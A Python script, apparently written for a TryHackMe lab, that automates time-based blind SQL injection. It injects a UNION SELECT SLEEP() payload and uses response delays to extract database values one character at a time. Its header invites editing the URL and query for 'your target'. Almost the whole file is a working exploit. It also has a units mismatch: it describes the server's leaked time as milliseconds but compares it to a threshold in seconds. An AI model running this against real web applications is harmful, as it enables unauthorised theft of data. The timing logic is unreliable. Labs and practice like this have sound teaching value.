#!/usr/bin/env python3
"""
Time-based blind SQLi enumeration (THM Level 4 style).

Uses the `time` field the server leaks in the response as a high-precision
oracle. Each request asks "is the condition true?" and the server returns
its own query execution time in milliseconds.

If the leak is missing (true network-only timing), fall back to wall-clock
measurement and set SLEEP to a value comfortably above network jitter.

Educational version — linear scan over a charset, no parallelization.
Optimize for correctness, not speed.

Usage:
    edit BASE_URL, LEVEL, the SELECT_TEMPLATE, and SLEEP_SECONDS for your target
    python time_based_enum.py
"""
import urllib.request
import urllib.parse
import json
import string
import sys
import time as _time

# ---- CONFIG ----------------------------------------------------------------
BASE_URL = "https://YOUR-INSTANCE.reverse-proxy.cell-prod-eu-central-1a.vm.tryhackme.com/run"
LEVEL = "4"

# What are we extracting? Edit the inner SELECT for your target.
# The boolean condition is the `WHERE` clause. If it matches, the FROM row
# exists and the SLEEP runs; if not, the SLEEP never runs and timing stays
# at the baseline.
SELECT_TEMPLATE = (
    "select * from analytics_referrers where domain='' "
    "UNION SELECT SLEEP({sleep}),2 FROM users "
    "WHERE ({expr}) like '{{prefix}}%';--' LIMIT 1"
)

EXPRESSION = "database()"

# Sleep duration per request. With a server-leaked `time` field, 2s is plenty.
# For network-only timing, use 5s+ and rely on the wall-clock fallback.
SLEEP_SECONDS = 2

# Threshold above which we treat the response as "TRUE".
# With server-leaked timing, anything > SLEEP_SECONDS * 0.9 is TRUE.
# With network-only timing, use a value comfortably above your baseline jitter.
TRUE_THRESHOLD = SLEEP_SECONDS * 0.9

CHARSET = string.ascii_lowercase + string.digits + "_"
MAX_LEN = 30
# -----------------------------------------------------------------------------


def time_oracle(sql: str) -> bool:
    """
    Send the SQL, return True if the response took longer than the threshold.

    Prefers the server-leaked `time` field; falls back to wall-clock if absent.
    """
    body = urllib.parse.urlencode({"level": LEVEL, "sql": sql}).encode()
    req = urllib.request.Request(
        BASE_URL, data=body, headers={"Content-Type": "application/x-www-form-urlencoded"}
    )
    t0 = _time.perf_counter()
    with urllib.request.urlopen(req) as r:
        resp = json.loads(r.read().decode())
    wall = _time.perf_counter() - t0
    leaked = resp.get("time")
    measured = leaked if leaked is not None else wall
    return measured >= TRUE_THRESHOLD


def enumerate() -> str:
    """Walk the value one character at a time."""
    value = ""
    while len(value) < MAX_LEN:
        found = False
        for c in CHARSET:
            sql = SELECT_TEMPLATE.format(sleep=SLEEP_SECONDS, expr=EXPRESSION).format(prefix=value + c)
            if time_oracle(sql):
                value += c
                sys.stdout.write(f"\r[+] {value}")
                sys.stdout.flush()
                found = True
                break
        if not found:
            # Confirm: is `value` an exact match (no wildcard)?
            sql = SELECT_TEMPLATE.format(sleep=SLEEP_SECONDS, expr=EXPRESSION).format(prefix=value)
            if time_oracle(sql):
                sys.stdout.write(f"\n[DONE] {value!r}\n")
                return value
            sys.stdout.write(f"\n[END?] partial={value!r}\n")
            return value
    sys.stdout.write(f"\n[LEN] truncated at {MAX_LEN}\n")
    return value


if __name__ == "__main__":
    # Measure baseline before we start.
    sample = SELECT_TEMPLATE.format(sleep=0, expr="database()").format(prefix="zzzzzzzzz")
    body = urllib.parse.urlencode({"level": LEVEL, "sql": sample}).encode()
    req = urllib.request.Request(
        BASE_URL, data=body, headers={"Content-Type": "application/x-www-form-urlencoded"}
    )
    t0 = _time.perf_counter()
    with urllib.request.urlopen(req) as r:
        resp = json.loads(r.read().decode())
    baseline = resp.get("time") or (_time.perf_counter() - t0)
    print(f"[*] baseline: {baseline * 1000:.1f}ms")
    print(f"[*] threshold: {TRUE_THRESHOLD * 1000:.0f}ms")
    print(f"[*] sleep: {SLEEP_SECONDS}s")
    print(f"[*] target: {BASE_URL}")
    print(f"[*] expression: {EXPRESSION}")
    enumerate()
